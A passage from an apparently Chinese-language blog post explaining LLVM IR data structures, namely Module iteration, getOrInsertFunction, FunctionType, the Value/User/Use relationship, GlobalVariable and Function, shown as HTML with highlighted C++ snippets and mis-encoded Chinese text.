class="hljs-built_in">make_range</span>(<span class="hljs-built_in">begin</span>(), <span class="hljs-built_in">end</span>());<br>  &#125;<br>  <span class="hljs-function">iterator_range&lt;const_iterator&gt; <span class="hljs-title">functions</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">begin</span>(), <span class="hljs-built_in">end</span>());<br>  &#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;func : *<span class="hljs-keyword">module</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;func : <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">functions</span>());<br></code></pre></td></tr></table></figure></li><li><p>Global Variable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// @&#125;</span><br><span class="hljs-comment">/// @name Global Variable Iteration</span><br><span class="hljs-comment">/// @&#123;</span><br><br>  <span class="hljs-function">global_iterator       <span class="hljs-title">global_begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">const_global_iterator <span class="hljs-title">global_begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">global_iterator       <span class="hljs-title">global_end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">end</span>(); &#125;<br>  <span class="hljs-function">const_global_iterator <span class="hljs-title">global_end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">end</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">size_t</span>                <span class="hljs-title">global_size</span> <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">size</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">bool</span>                  <span class="hljs-title">global_empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">empty</span>(); &#125;<br><br>  <span class="hljs-function">iterator_range&lt;global_iterator&gt; <span class="hljs-title">globals</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">global_begin</span>(), <span class="hljs-built_in">global_end</span>());<br>  &#125;<br>  <span class="hljs-function">iterator_range&lt;const_global_iterator&gt; <span class="hljs-title">globals</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">global_begin</span>(), <span class="hljs-built_in">global_end</span>());<br>  &#125;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;var : <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">globals</span>());<br></code></pre></td></tr></table></figure></li></ul><h2 id="è·å–åˆ—è¡¨"><a href="#è·å–åˆ—è¡¨" class="headerlink" title="è·å–åˆ—è¡¨"></a>è·å–åˆ—è¡¨</h2><ul><li><p>Function</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// Get the Module&#x27;s list of functions (constant).</span><br><span class="hljs-function"><span class="hljs-type">const</span> FunctionListType &amp;<span class="hljs-title">getFunctionList</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>     </span>&#123; <span class="hljs-keyword">return</span> FunctionList; &#125;<br><span class="hljs-comment">/// Get the Module&#x27;s list of functions.</span><br><span class="hljs-function">FunctionListType       &amp;<span class="hljs-title">getFunctionList</span><span class="hljs-params">()</span>           </span>&#123; <span class="hljs-keyword">return</span> FunctionList; &#125;<br></code></pre></td></tr></table></figure></li><li><p>Global Variable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// Get the Module&#x27;s list of global variables (constant).</span><br><span class="hljs-function"><span class="hljs-type">const</span> GlobalListType   &amp;<span class="hljs-title">getGlobalList</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>       </span>&#123; <span class="hljs-keyword">return</span> GlobalList; &#125;<br><span class="hljs-comment">/// Get the Module&#x27;s list of global variables.</span><br><span class="hljs-function">GlobalListType         &amp;<span class="hljs-title">getGlobalList</span><span class="hljs-params">()</span>             </span>&#123; <span class="hljs-keyword">return</span> GlobalList; &#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="å‡½æ•°æ“ä½œ"><a href="#å‡½æ•°æ“ä½œ" class="headerlink" title="å‡½æ•°æ“ä½œ"></a>å‡½æ•°æ“ä½œ</h2><p>æŸ¥æ‰¾å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Function *<span class="hljs-title">getFunction</span><span class="hljs-params">(StringRef Name)</span> <span class="hljs-type">const</span></span>;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br>Function *pmain = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getFunction</span>(<span class="hljs-string">&quot;main&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾Oræ’å…¥å‡½æ•°"><a href="#æŸ¥æ‰¾Oræ’å…¥å‡½æ•°" class="headerlink" title="æŸ¥æ‰¾Oræ’å…¥å‡½æ•°"></a>æŸ¥æ‰¾Oræ’å…¥å‡½æ•°</h3><p>Moduleä¸­æä¾›äº†ä¸€ç³»åˆ—æ’å…¥oræŸ¥æ‰¾Functionçš„å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name, FunctionType *T,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     AttributeList AttributeList)</span></span>;<br><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name, FunctionType *T)</span></span>;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span>... ArgsTy&gt;<br><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     AttributeList AttributeList, Type *RetTy,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     ArgsTy... Args)</span></span>;<br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span>... ArgsTy&gt;<br><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name, Type *RetTy,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     ArgsTy... Args)</span></span>;<br></code></pre></td></tr></table></figure><p>éœ€è¦</p><ul><li><p>StringRef Nameï¼šå‡½æ•°å</p></li><li><p>Type *RetTyï¼šè¿”å›å€¼ç±»å‹</p><p>Typeç±»å‹æä¾›äº†æ„é€ å„ç§ç±»å‹çš„é™æ€å‡½æ•°ï¼Œåªéœ€è¦æä¾›Moduleçš„Context</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getVoidTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getLabelTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getHalfTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getBFloatTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getFloatTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getDoubleTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getMetadataTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getX86_FP80Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getFP128Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getPPC_FP128Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getX86_MMXTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getX86_AMXTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getTokenTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getIntNTy</span><span class="hljs-params">(LLVMContext &amp;C, <span class="hljs-type">unsigned</span> N)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt1Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt8Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt16Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt32Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt64Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt128Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼Œè®°å¾—å‘½åç©ºé—´</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>())<br></code></pre></td></tr></table></figure></li><li><p>ArgsTyâ€¦ Argsï¼šæ¯ä¸ªå‚æ•°çš„ç±»å‹</p></li><li><p>FunctionType *Tï¼šå‡½æ•°ç±»å‹ï¼ˆå…¶å®å°±æ˜¯å‚æ•°ç±»å‹å’Œè¿”å›å€¼ç±»å‹çš„é›†åˆï¼‰ï¼Œå¯ä»¥é€šè¿‡getæ–¹æ³•æ„é€ </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionType</span> : <span class="hljs-keyword">public</span> Type &#123;<br>  <span class="hljs-function"><span class="hljs-type">static</span> FunctionType *<span class="hljs-title">get</span><span class="hljs-params">(Type *Result,</span></span><br><span class="hljs-params"><span class="hljs-function">                           ArrayRef&lt;Type*&gt; Params, <span class="hljs-type">bool</span> isVarArg)</span></span>;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼ŒisVarArgæ˜¯æ˜¯å¦æ”¯æŒå¯å˜å‚æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">FunctionType *funcTy = FunctionType::<span class="hljs-built_in">get</span>(ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), &#123;ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>())&#125;, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure></li><li><p>AttributeList AttributeListï¼šå…ˆå¿½ç•¥ï¼ˆ</p></li></ul><p>ğŸŒ°ğŸŒ°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">FunctionType *funcTy = FunctionType::<span class="hljs-built_in">get</span>(ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), &#123;ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>())&#125;, <span class="hljs-literal">false</span>);<br>FunctionCallee callee = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getOrInsertFunction</span>(<span class="hljs-string">&quot;myadd&quot;</span>, funcTy);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">FunctionCallee callee = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getOrInsertFunction</span>(<span class="hljs-string">&quot;myadd&quot;</span>, ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()),ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()));<br></code></pre></td></tr></table></figure><p>è¿”å›å€¼ç±»å‹æ˜¯FunctionCalleeï¼Œæˆå‘˜ä¸ºä¸€ä¸ªValueæŒ‡é’ˆå’Œä¸€ä¸ªFunctionTypeæŒ‡é’ˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionCallee</span> &#123;<br><br><span class="hljs-keyword">private</span>:<br>  FunctionType *FnTy = <span class="hljs-literal">nullptr</span>;<br>  Value *Callee = <span class="hljs-literal">nullptr</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡publicæ–¹æ³•è·å–è¿™ä¸¤ä¸ªæˆå‘˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FunctionType *<span class="hljs-title">getFunctionType</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> FnTy; &#125;<br><span class="hljs-function">Value *<span class="hljs-title">getCallee</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> Callee; &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªValueæŒ‡é’ˆå®é™…ä¸Šå°±æ˜¯æŒ‡å‘æ„é€ çš„Functionï¼Œä»getOrInsertFunctionæºç å¯ä»¥çœ‹å‡ºæ¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FunctionCallee <span class="hljs-title">Module::getOrInsertFunction</span><span class="hljs-params">(StringRef Name, FunctionType *Ty,</span></span><br><span class="hljs-params"><span class="hljs-function">                                           AttributeList AttributeList)</span> </span>&#123;<br>  <span class="hljs-comment">// See if we have a definition for the specified function already.</span><br>  GlobalValue *F = <span class="hljs-built_in">getNamedValue</span>(Name);<br>  <span class="hljs-keyword">if</span> (!F) &#123;<br>    <span class="hljs-comment">// Nope, add it</span><br>    Function *New = Function::<span class="hljs-built_in">Create</span>(Ty, GlobalVariable::ExternalLinkage,<br>                                     DL.<span class="hljs-built_in">getProgramAddressSpace</span>(), Name);<br>    <span class="hljs-keyword">if</span> (!New-&gt;<span class="hljs-built_in">isIntrinsic</span>())       <span class="hljs-comment">// Intrinsics get attrs set on construction</span><br>      New-&gt;<span class="hljs-built_in">setAttributes</span>(AttributeList);<br>    FunctionList.<span class="hljs-built_in">push_back</span>(New);<br>    <span class="hljs-keyword">return</span> &#123;Ty, New&#125;; <span class="hljs-comment">// Return the new prototype.</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨çš„æ—¶å€™éœ€è¦ç±»å‹è½¬æ¢</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function *customFunc = <span class="hljs-built_in">dyn_cast</span>&lt;Function&gt;(callee.<span class="hljs-built_in">getCallee</span>());<br></code></pre></td></tr></table></figure><h1 id="Valueï¼ŒUserå’ŒUse"><a href="#Valueï¼ŒUserå’ŒUse" class="headerlink" title="Valueï¼ŒUserå’ŒUse"></a>Valueï¼ŒUserå’ŒUse</h1><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/def-use.png" class title="def-use"><p>ä¸€ä¸ªå½¢å¦‚<code>%1 = add i32 %2, %3</code>è¿™é‡Œè¿™ä¸ªInstructionå°±æ˜¯Userï¼ˆValueçš„ä½¿ç”¨è€…ï¼‰ï¼Œ%2ã€%3å°±æ˜¯è¢«ä½¿ç”¨çš„Valueï¼ŒUseå°±æ˜¯è¿™ä¸ªä½¿ç”¨çš„è¡Œä¸ºï¼Œåœ¨æ•°æ®ç»“æ„ä¸­ä½“ç°ä¸ºä¸¤ç‚¹ï¼ˆUserå’ŒValueï¼‰ä¹‹é—´çš„ä¸€æ¡è¾¹</p><h2 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h2><p>Valueç±»ä¸­æœ‰ä¸€ä¸ªUseListæˆå‘˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Value</span> &#123;<br>  Use *UseList;<br></code></pre></td></tr></table></figure><p>æŒ‡å‘ç¬¬ä¸€ä¸ªUse</p><h2 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h2><p>ä¸€ä¸ªValueè¢«ä½¿ç”¨çš„æ‰€æœ‰Useä»¥é“¾è¡¨çš„å½¢å¼è¿åœ¨ä¸€èµ·</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Use</span> &#123;<br><span class="hljs-keyword">private</span>:<br>  Value *Val = <span class="hljs-literal">nullptr</span>;<br>  Use *Next = <span class="hljs-literal">nullptr</span>;<br>  Use **Prev = <span class="hljs-literal">nullptr</span>;<br>  User *Parent = <span class="hljs-literal">nullptr</span>;<br></code></pre></td></tr></table></figure><ul><li>Valï¼šæŒ‡å‘è¢«ä½¿ç”¨çš„Value</li><li>Nextï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªUse</li><li>Prevï¼šæŒ‡å‘ä¸Šä¸€ä¸ªPrev</li><li>Parentï¼šæŒ‡å‘User</li></ul><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><p>Useä¼šæ”¾åœ¨Userç»“æ„ä½“å‰ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºğŸ‘†</p><p>Useç»“æ„ä½“æœ‰ä¸¤ç§æ”¾ç½®æ–¹å¼</p><ul><li><p>å›ºå®šä¸ªæ•°çš„Useï¼Œä»¥æ•°ç»„çš„å½¢å¼æ”¾åœ¨Userå‰</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/use1.png" class title="use1"></li><li><p>ä¸å®šä¸ªæ•°çš„Useï¼Œä¸€ä¸ªUseæ”¾åœ¨Userå‰ï¼Œè¿™ä¸ªUseçš„PrevæŒ‡é’ˆæŒ‡å‘Useæ•°ç»„</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/use2.png" class title="use2"></li></ul><p>è¿™ç‚¹å¯ä»¥é€šè¿‡getOperandListå‡½æ•°çœ‹å‡ºæ¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// HasHungOffUsesæ˜¯Valueçš„æˆå‘˜  </span><br><br><span class="hljs-function"><span class="hljs-type">const</span> Use *<span class="hljs-title">getOperandList</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> HasHungOffUses ? <span class="hljs-built_in">getHungOffOperands</span>() : <span class="hljs-built_in">getIntrusiveOperands</span>();<br>  &#125;<br><br><span class="hljs-function"><span class="hljs-type">const</span> Use *<span class="hljs-title">getHungOffOperands</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> Use *<span class="hljs-type">const</span> *&gt;(<span class="hljs-keyword">this</span>) - <span class="hljs-number">1</span>);<br>  &#125;<br><span class="hljs-function"><span class="hljs-type">const</span> Use *<span class="hljs-title">getIntrusiveOperands</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> Use *&gt;(<span class="hljs-keyword">this</span>) - NumUserOperands;<br>  &#125;<br></code></pre></td></tr></table></figure><p>å½“HasHungOffUsesä¸º0æ—¶ï¼ŒUseçš„PrevæŒ‡å‘å‰ä¸€ä¸ªUseçš„Nextï¼Œç”±äºPrevæ˜¯Use**ç±»å‹æ‰€ä»¥å…¶å®è¿˜æ˜¯æŒ‡å‘è‡ªå·±ï¼ˆ</p><h1 id="GlobalVariable"><a href="#GlobalVariable" class="headerlink" title="GlobalVariable"></a>GlobalVariable</h1><p>å‚¨å­˜å…¨å±€å˜é‡ç›¸å…³ä¿¡æ¯</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/GlobalVariable.png" class title="GlobalVariable"><h2 id="ç›¸å…³æ“ä½œ"><a href="#ç›¸å…³æ“ä½œ" class="headerlink" title="ç›¸å…³æ“ä½œ"></a>ç›¸å…³æ“ä½œ</h2><ul><li><p>åˆ›å»ºä¸€ä¸ªGlobalVariable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">GlobalVariable</span>(Type *Ty, <span class="hljs-type">bool</span> isConstant, LinkageTypes Linkage,<br>               Constant *Initializer = <span class="hljs-literal">nullptr</span>, <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>,<br>               ThreadLocalMode = NotThreadLocal, <span class="hljs-type">unsigned</span> AddressSpace = <span class="hljs-number">0</span>,<br>               <span class="hljs-type">bool</span> isExternallyInitialized = <span class="hljs-literal">false</span>);<br>  <br><span class="hljs-built_in">GlobalVariable</span>(Module &amp;M, Type *Ty, <span class="hljs-type">bool</span> isConstant, LinkageTypes Linkage,<br>               Constant *Initializer, <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>,<br>               GlobalVariable *InsertBefore = <span class="hljs-literal">nullptr</span>,<br>               ThreadLocalMode = NotThreadLocal,<br>               Optional&lt;<span class="hljs-type">unsigned</span>&gt; AddressSpace = None,<br>               <span class="hljs-type">bool</span> isExternallyInitialized = <span class="hljs-literal">false</span>);<br>  <br><span class="hljs-built_in">GlobalVariable</span>(<span class="hljs-type">const</span> GlobalVariable &amp;) = <span class="hljs-keyword">delete</span>;<br>GlobalVariable &amp;<span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> GlobalVariable &amp;) = <span class="hljs-keyword">delete</span>;<br></code></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­æ˜¯å¦èƒ½åœ¨è¿è¡Œæ—¶ä¿®æ”¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isConstant</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br></code></pre></td></tr></table></figure></li></ul><h1 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h1><p>ä¸»è¦æˆå‘˜æœ‰</p><ul><li>ä¸€ä¸ªArgumentsæŒ‡é’ˆï¼ŒæŒ‡å‘Argumentæ•°ç»„</li><li>ä¸€ä¸ªBasicBlockåŒé“¾è¡¨</li></ul><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/Function.png" class title="Function"><h2 id="ç›¸å…³æ“ä½œ-1"><a href="#ç›¸å…³æ“ä½œ-1" class="headerlink" title="ç›¸å…³æ“ä½œ"></a>ç›¸å…³æ“ä½œ</h2><ul><li><p>è¿­ä»£å™¨ï¼Œç›¸å…³æ“ä½œåŒModule</p><ul><li><p>BasicBlockè¿­ä»£å™¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 